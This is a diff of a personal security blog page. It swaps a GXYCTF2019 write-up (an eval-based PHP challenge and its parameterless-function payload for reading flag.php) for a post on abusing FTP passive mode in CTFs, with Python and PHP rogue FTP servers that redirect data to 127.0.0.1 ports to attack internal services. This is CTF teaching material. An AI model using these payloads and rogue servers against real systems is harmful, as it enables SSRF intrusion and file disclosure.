@@ -3,27 +3,26 @@
 <head>
     <meta charset="utf-8">
     
-    <title>GXYCTF2019 禁止套娃 | npC4t&#39;s Blog</title>
+    <title>CTF中ftp协议的利用 | npC4t&#39;s Blog</title>
     
     
-        <meta name="keywords" content="php代码审计" />
+        <meta name="keywords" content="ftp协议" />
     
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="0x01.git源码泄露，利用工具下载源码">
+    <meta name="description" content="ftp协议简单介绍">
 <meta property="og:type" content="article">
-<meta property="og:title" content="GXYCTF2019 禁止套娃">
-<meta property="og:url" content="https://123-prog.github.io/2021/03/10/GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/index.html">
+<meta property="og:title" content="CTF中ftp协议的利用">
+<meta property="og:url" content="https://123-prog.github.io/2021/10/04/CTF%E4%B8%ADftp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/index.html">
 <meta property="og:site_name" content="npC4t&#39;s Blog">
-<meta property="og:description" content="0x01.git源码泄露，利用工具下载源码">
+<meta property="og:description" content="ftp协议简单介绍">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://123-prog.github.io/2021/03/10/GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/Snipaste_2021-03-10_20-54-43.png">
-<meta property="og:image" content="https://123-prog.github.io/2021/03/10/GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/Snipaste_2021-03-10_20-55-17.png">
-<meta property="article:published_time" content="2021-03-10T12:29:49.000Z">
-<meta property="article:modified_time" content="2021-09-22T10:03:21.060Z">
+<meta property="og:image" content="https://123-prog.github.io/2021/10/04/CTF%E4%B8%ADftp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/Snipaste_2021-10-04_18-02-12.png">
+<meta property="article:published_time" content="2021-10-04T09:54:12.000Z">
+<meta property="article:modified_time" content="2021-10-04T15:38:01.502Z">
 <meta property="article:author" content="npC4t">
-<meta property="article:tag" content="php代码审计">
+<meta property="article:tag" content="ftp协议">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://123-prog.github.io/2021/03/10/GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/Snipaste_2021-03-10_20-54-43.png">
+<meta name="twitter:image" content="https://123-prog.github.io/2021/10/04/CTF%E4%B8%ADftp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/Snipaste_2021-10-04_18-02-12.png">
     
 
     
@@ -225,22 +224,22 @@
                          <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/08/18/GKCTF-2021-hackme/">(GKCTF 2021)hackme</a></li>  </ul> 
                     </li> 
                     
-                    <li class="directory">
-                        <a href="#" data-role="directory">
-                            <i class="fa fa-folder"></i>
-                            &nbsp;
-                            other
-                        </a>
-                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/02/08/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Http/">极客大挑战 2019 Http</a></li>  <li class="file"><a href="/2021/09/17/RCTF2021-VerySafe/">(RCTF2021)VerySafe</a></li>  <li class="file"><a href="/2021/10/04/CTF%E4%B8%ADftp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/">CTF中ftp协议的利用</a></li>  </ul> 
-                    </li> 
-                    
                     <li class="directory open">
                         <a href="#" data-role="directory">
                             <i class="fa fa-folder-open"></i>
                             &nbsp;
+                            other
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/02/08/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Http/">极客大挑战 2019 Http</a></li>  <li class="file"><a href="/2021/09/17/RCTF2021-VerySafe/">(RCTF2021)VerySafe</a></li>  <li class="file active"><a href="/2021/10/04/CTF%E4%B8%ADftp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/">CTF中ftp协议的利用</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
                             php代码审计
                         </a>
-                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/01/14/HCTF-2018-Warmup/">HCTF 2018 Warmup</a></li>  <li class="file"><a href="/2021/01/20/BJDCTF2020-Easy-MD5/">BJDCTF2020 Easy MD5</a></li>  <li class="file"><a href="/2021/02/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/">极客大挑战 2019 PHP</a></li>  <li class="file"><a href="/2021/03/10/RoarCTF-2019-Easy-Calc/">(RoarCTF 2019) Easy Calc</a></li>  <li class="file active"><a href="/2021/03/10/GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/">GXYCTF2019 禁止套娃</a></li>  <li class="file"><a href="/2021/07/18/TCTF-0CTF-1linephp/">TCTF-0CTF 1linephp</a></li>  <li class="file"><a href="/2021/09/16/RCTF2021-Easyphp/">(RCTF2021) Easyphp</a></li>  </ul> 
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/01/14/HCTF-2018-Warmup/">HCTF 2018 Warmup</a></li>  <li class="file"><a href="/2021/01/20/BJDCTF2020-Easy-MD5/">BJDCTF2020 Easy MD5</a></li>  <li class="file"><a href="/2021/02/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/">极客大挑战 2019 PHP</a></li>  <li class="file"><a href="/2021/03/10/RoarCTF-2019-Easy-Calc/">(RoarCTF 2019) Easy Calc</a></li>  <li class="file"><a href="/2021/03/10/GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/">GXYCTF2019 禁止套娃</a></li>  <li class="file"><a href="/2021/07/18/TCTF-0CTF-1linephp/">TCTF-0CTF 1linephp</a></li>  <li class="file"><a href="/2021/09/16/RCTF2021-Easyphp/">(RCTF2021) Easyphp</a></li>  </ul> 
                     </li> 
                     
                     <li class="directory">
@@ -378,7 +377,7 @@
     <div id="toTop" class="fa fa-angle-up"></div>
 </aside>
             
-            <section id="main"><article id="post-GXYCTF2019-禁止套娃" class="article article-type-post" itemscope itemprop="blogPost">
+            <section id="main"><article id="post-CTF中ftp协议的利用" class="article article-type-post" itemscope itemprop="blogPost">
     <div class="article-inner">
         
         
@@ -388,20 +387,20 @@
                         
     <div class="article-category">
     	<i class="fa fa-folder"></i>
-        <a class="article-category-link" href="/categories/CTF/">CTF</a><i class="fa fa-angle-right"></i><a class="article-category-link" href="/categories/CTF/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">php代码审计</a>
+        <a class="article-category-link" href="/categories/CTF/">CTF</a><i class="fa fa-angle-right"></i><a class="article-category-link" href="/categories/CTF/other/">other</a>
     </div>
 
                         
     <div class="article-tag">
         <i class="fa fa-tag"></i>
-        <a class="tag-link-link" href="/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">php代码审计</a>
+        <a class="tag-link-link" href="/tags/ftp%E5%8D%8F%E8%AE%AE/" rel="tag">ftp协议</a>
     </div>
 
                         
     <div class="article-date">
         <i class="fa fa-calendar"></i>
-        <a href="/2021/03/10/GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/">
-            <time datetime="2021-03-10T12:29:49.000Z" itemprop="datePublished">2021-03-10</time>
+        <a href="/2021/10/04/CTF%E4%B8%ADftp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/">
+            <time datetime="2021-10-04T09:54:12.000Z" itemprop="datePublished">2021-10-04</time>
         </a>
     </div>
 
@@ -412,13 +411,13 @@
                         
                         
                             <div class="article-meta-button">
-                                <a target="_blank" rel="noopener" href='https://github.com/zthxxx/Wiki-site/raw/writing/source/_posts/GXYCTF2019-禁止套娃.md'> Source </a>
+                                <a target="_blank" rel="noopener" href='https://github.com/zthxxx/Wiki-site/raw/writing/source/_posts/CTF中ftp协议的利用.md'> Source </a>
                             </div>
                             <div class="article-meta-button">
-                                <a target="_blank" rel="noopener" href='https://github.com/zthxxx/Wiki-site/edit/writing/source/_posts/GXYCTF2019-禁止套娃.md'> Edit </a>
+                                <a target="_blank" rel="noopener" href='https://github.com/zthxxx/Wiki-site/edit/writing/source/_posts/CTF中ftp协议的利用.md'> Edit </a>
                             </div>
                             <div class="article-meta-button">
-                                <a target="_blank" rel="noopener" href='https://github.com/zthxxx/Wiki-site/commits/writing/source/_posts/GXYCTF2019-禁止套娃.md'> History </a>
+                                <a target="_blank" rel="noopener" href='https://github.com/zthxxx/Wiki-site/commits/writing/source/_posts/CTF中ftp协议的利用.md'> History </a>
                             </div>
                         
                     </div>
@@ -426,7 +425,7 @@
                 
     
         <h1 class="article-title" itemprop="name">
-            GXYCTF2019 禁止套娃
+            CTF中ftp协议的利用
         </h1>
     
 
@@ -437,20 +436,32 @@
         
         
             
+                <div id="toc" class="toc-article">
+                <strong class="toc-title">Catalogue</strong>
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#ftp%E5%8D%8F%E8%AE%AE%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">ftp协议简单介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ftp%E7%9A%84%E8%A2%AB%E5%8A%A8%E6%A8%A1%E5%BC%8F"><span class="toc-number">2.</span> <span class="toc-text">ftp的被动模式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">应用</span></a></li></ol>
+                </div>
+            
         
         
-            <h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>.git源码泄露，利用工具下载源码</p>
-<a id="more"></a>
+            <h3 id="ftp协议简单介绍"><a href="#ftp协议简单介绍" class="headerlink" title="ftp协议简单介绍"></a>ftp协议简单介绍</h3><a id="more"></a>
 
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>需要绕一下正则，第一个条件限制各种协议</p>
-<p>第二个正则匹配替换，?R是递归匹配，表示引用这个式子继续往里面套娃，最后匹配的应该像这样的字符串xxx(xxx(xx(xxx()))),不能存在参数，所以需要利用无参数的代码执行读取flag</p>
-<p>payload</p>
-<p><code>highlight_file(next(array_reverse(scandir(pos(localeconv())))));</code></p>
-<p><img src="/2021/03/10/GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/Snipaste_2021-03-10_20-54-43.png"></p>
-<p><img src="/2021/03/10/GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/Snipaste_2021-03-10_20-55-17.png"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">localeconv()是一个数组，在这里主要是拿来获取点号，本来的功能无关紧要，pos()就是current()别名，获取数组第一个元素，这里就是点号</span><br><span class="line">scandir()得到当前目录内容，可以看到flag.php在数组的倒数第二个，要获取到flag.php，还得利用到array_reverse()对数组逆序处理</span><br><span class="line">next()获取数组当前元素的下一个元素，在这里就是第二个元素，flag.php</span><br><span class="line">最后highlight_file()</span><br><span class="line">搞定</span><br></pre></td></tr></table></figure>
-<p>本来利用getcwd()获取当前工作目录应该也可行，但可惜et被第三个正则过滤了</p>
+<p>跟http协议一样，它也是一个文本协议，用于在客户端和服务端之间传输数据，它拥有自己的控制命令，客户端发送指定命令到服务端，服务端返回相应的状态码和信息；</p>
+<p>ftp默认端口两个，20和21，其中20用于传输数据，21用于传输控制信息；</p>
+<p>看一个例子</p>
+<p><img src="/2021/10/04/CTF%E4%B8%ADftp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/Snipaste_2021-10-04_18-02-12.png"></p>
+<p>这是我用vsftpd服务抓的一个包，可以看到ftp服务端和客户端之间的交互就是简单的文本命令</p>
+<p>各种命令和状态码代表的意义参考<a target="_blank" rel="noopener" href="https://www.iteye.com/blog/justcoding-835002">https://www.iteye.com/blog/justcoding-835002</a></p>
+<h3 id="ftp的被动模式"><a href="#ftp的被动模式" class="headerlink" title="ftp的被动模式"></a>ftp的被动模式</h3><p>CTF中最多利用的就是ftp的被动模式，ftp传输数据的方式分为主动模式port和被动模式pasv，主动和被动的对象是服务端，主动即传输数据时，服务端主动去连接客户端的某个端口，用创建的这个连接来传输数据，被动模式即服务端给客户端提供一个端口，让客户端发起连接，这个过程，服务端处于被动连接状态，所以叫被动模式</p>
+<p>被动模式的利用很简单，被动模式的服务端不仅可以指定客户端连接的端口，还可以指定客户端连接的地址，如果我们将这个地址指定为127.0.0.1，即客户端本地，客户端就会将数据送至本地某个端口，即可成功将数据送进内网，攻击内网中其他应用</p>
+<h3 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h3><p>CTF中，常见的就是在vps上搭恶意ftp服务器，用于转发数据进内网完成攻击</p>
+<p>简单实现ftp服务器</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   <span class="comment">#创建tcp socket</span></span><br><span class="line">s.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="number">23</span>)) </span><br><span class="line">s.listen(<span class="number">1</span>) </span><br><span class="line"></span><br><span class="line">conn, addr = s.accept()</span><br><span class="line">conn.send(<span class="string">b&#x27;220 \n&#x27;</span>)</span><br><span class="line">print(conn.recv(<span class="number">20</span>))</span><br><span class="line"></span><br><span class="line">conn.send(<span class="string">b&#x27;230 Login successful.\n&#x27;</span>)</span><br><span class="line">print(conn.recv(<span class="number">20</span>))</span><br><span class="line"></span><br><span class="line">conn.send(<span class="string">b&#x27;200 \n&#x27;</span>)</span><br><span class="line">print(conn.recv(<span class="number">20</span>))</span><br><span class="line"><span class="comment">#SIZE /aaa\r\n</span></span><br><span class="line">conn.send(<span class="string">b&#x27;550 Could not get the file size.\n&#x27;</span>)</span><br><span class="line">print(conn.recv(<span class="number">20</span>))</span><br><span class="line"><span class="comment">#EPSV\r\n</span></span><br><span class="line">conn.send(<span class="string">b&#x27;200 \n&#x27;</span>)</span><br><span class="line">print(conn.recv(<span class="number">20</span>)) </span><br><span class="line"><span class="comment">#PASV\r\n</span></span><br><span class="line">conn.send(<span class="string">b&#x27;227 127,0,0,1,0,9001\n&#x27;</span>)   <span class="comment">#0*256+9001</span></span><br><span class="line">print(conn.recv(<span class="number">20</span>))</span><br><span class="line"></span><br><span class="line">conn.send(<span class="string">b&#x27;150 Permission denied.\n&#x27;</span>)</span><br><span class="line">conn.send(<span class="string">b&#x27;221 Goodbye.\n&#x27;</span>)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure>
+<p>除此之外，还有一种情况，实例代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = file_get_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">file_put_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>],<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure>
+<p>利用方式有一点差别，同样利用ftp协议，第一次连接我们需要将payload发送给$data，第二次连接同上被动模式，将$data送到指定服务</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  <span class="comment">#创建tcp socket</span></span><br><span class="line">s.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="number">2000</span>))</span><br><span class="line">s.listen(<span class="number">1</span>)</span><br><span class="line">so = socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="comment">#用于传输数据</span></span><br><span class="line"></span><br><span class="line">so.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="number">2001</span>))</span><br><span class="line">so.listen(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">counts = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;xxx&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span> counts == <span class="number">1</span>:</span><br><span class="line">        conn, addr = s.accept()</span><br><span class="line"></span><br><span class="line">        conn.send(<span class="string">b&#x27;200 \n&#x27;</span>)  </span><br><span class="line">        print(conn.recv(<span class="number">20</span>)) <span class="comment">#b&#x27;USER anonymous\r\n&#x27;n</span></span><br><span class="line">        conn.send(<span class="string">b&#x27;230 login successful.\n&#x27;</span>)</span><br><span class="line">        print(conn.recv(<span class="number">20</span>)) <span class="comment">#b&#x27;TYPE I\r\n&#x27;</span></span><br><span class="line">        conn.send(<span class="string">b&#x27;200 \n&#x27;</span>)</span><br><span class="line">        print(conn.recv(<span class="number">20</span>)) <span class="comment">#b&#x27;SIZE /aaa\r\n&#x27;</span></span><br><span class="line">        conn.send(<span class="string">b&#x27;213 \n&#x27;</span>)</span><br><span class="line">        print(conn.recv(<span class="number">20</span>)) <span class="comment">#b&#x27;EPSV\r\n&#x27;</span></span><br><span class="line">        conn.send(<span class="string">b&#x27;200 \n&#x27;</span>)</span><br><span class="line">        print(conn.recv(<span class="number">20</span>)) <span class="comment">#b&#x27;PASV\r\n&#x27;</span></span><br><span class="line">        conn.send(<span class="string">b&#x27;227 127,0,0,1,0,2001\n&#x27;</span>)</span><br><span class="line">        print(conn.recv(<span class="number">20</span>)) </span><br><span class="line"></span><br><span class="line">        conn.send(<span class="string">b&#x27;150 \n&#x27;</span>) <span class="comment">#告诉客户端数据连接已经准备好了，可以开始传输</span></span><br><span class="line">        conn2,addr2 = so.accept()  <span class="comment">#新建连接，传输数据</span></span><br><span class="line">        conn2.send(payload)  <span class="comment">#这里发送payload</span></span><br><span class="line">        conn2.close()</span><br><span class="line">        conn.send(<span class="string">b&#x27;226 \n&#x27;</span>) <span class="comment">#告诉客户端数据已经传输完成</span></span><br><span class="line">        print(conn.recv(<span class="number">20</span>))</span><br><span class="line">        conn.send(<span class="string">b&#x27;221 Goodbye.\n&#x27;</span>)</span><br><span class="line">        conn.close()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        conn, addr = s.accept()</span><br><span class="line">        conn.send(<span class="string">b&#x27;220 \n&#x27;</span>)</span><br><span class="line">        print(conn.recv(<span class="number">20</span>))</span><br><span class="line">        conn.send(<span class="string">b&#x27;230 Login successful.\n&#x27;</span>)</span><br><span class="line">        print(conn.recv(<span class="number">20</span>))</span><br><span class="line">        conn.send(<span class="string">b&#x27;200 \n&#x27;</span>)</span><br><span class="line">        print(conn.recv(<span class="number">20</span>)) <span class="comment">#SIZE /aaa\r\n</span></span><br><span class="line">        conn.send(<span class="string">b&#x27;550 Could not get the file size.\n&#x27;</span>)</span><br><span class="line">        print(conn.recv(<span class="number">20</span>)) <span class="comment">#EPSV\r\n</span></span><br><span class="line">        conn.send(<span class="string">b&#x27;200 \n&#x27;</span>)</span><br><span class="line">        print(conn.recv(<span class="number">20</span>)) <span class="comment">#PASV\r\n</span></span><br><span class="line">        conn.send(<span class="string">b&#x27;227 127,0,0,1,0,9001\n&#x27;</span>)</span><br><span class="line">        print(conn.recv(<span class="number">20</span>))</span><br><span class="line">        conn.send(<span class="string">b&#x27;150 Permission denied.\n&#x27;</span>)</span><br><span class="line">        conn.send(<span class="string">b&#x27;221 Goodbye.\n&#x27;</span>)</span><br><span class="line">        conn.close()</span><br><span class="line">    counts += <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>有时候可能靶机没有出网，就连接不了我们构造的恶意ftp服务，但如果能拿到webshell的话，例如php的shell，我们依旧可以利用shell在靶机本地起我们的恶意ftp服务，附上ftp服务器php版本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$socket</span> = stream_socket_server(<span class="string">&quot;tcp://0.0.0.0:2000&quot;</span>,<span class="variable">$errno</span>,<span class="variable">$err</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$socket</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$errno</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$err</span>.<span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$conn</span> = stream_socket_accept(<span class="variable">$socket</span>))&#123;</span><br><span class="line">        fwrite(<span class="variable">$conn</span>,<span class="string">&quot;220 \n&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> fgets(<span class="variable">$conn</span>);</span><br><span class="line">        fwrite(<span class="variable">$conn</span>,<span class="string">&quot;230 Login successful.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> fgets(<span class="variable">$conn</span>);</span><br><span class="line">        fwrite(<span class="variable">$conn</span>,<span class="string">&quot;200 \n&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> fgets(<span class="variable">$conn</span>);</span><br><span class="line">        fwrite(<span class="variable">$conn</span>,<span class="string">&quot;550 Could not get the file size.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> fgets(<span class="variable">$conn</span>);</span><br><span class="line">        fwrite(<span class="variable">$conn</span>,<span class="string">&quot;200 \n&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> fgets(<span class="variable">$conn</span>);</span><br><span class="line">        fwrite(<span class="variable">$conn</span>,<span class="string">&quot;227 127,0,0,1,0,9000\n&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> fgets(<span class="variable">$conn</span>);</span><br><span class="line">        fwrite(<span class="variable">$conn</span>,<span class="string">&quot;150 Permission denied.\n&quot;</span>);</span><br><span class="line">        fwrite(<span class="variable">$conn</span>,<span class="string">&quot;221 Goodbye.\n&quot;</span>);</span><br><span class="line">        fclose(<span class="variable">$conn</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(<span class="variable">$socket</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
             </div>
         
@@ -463,19 +474,10 @@
     
 <nav id="article-nav">
     
-        <a href="/2021/04/04/VNCTF-2021-realezjvav/" id="article-nav-newer" class="article-nav-link-wrap">
-            <strong class="article-nav-caption">Newer</strong>
-            <div class="article-nav-title">
-                
-                    VNCTF 2021 realezjvav
-                
-            </div>
-        </a>
     
-    
-        <a href="/2021/03/10/RoarCTF-2019-Easy-Calc/" id="article-nav-older" class="article-nav-link-wrap">
+        <a href="/2021/10/03/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" id="article-nav-older" class="article-nav-link-wrap">
             <strong class="article-nav-caption">Older</strong>
-            <div class="article-nav-title">(RoarCTF 2019) Easy Calc</div>
+            <div class="article-nav-title">nodejs原型链污染</div>
         </a>
     
 </nav>
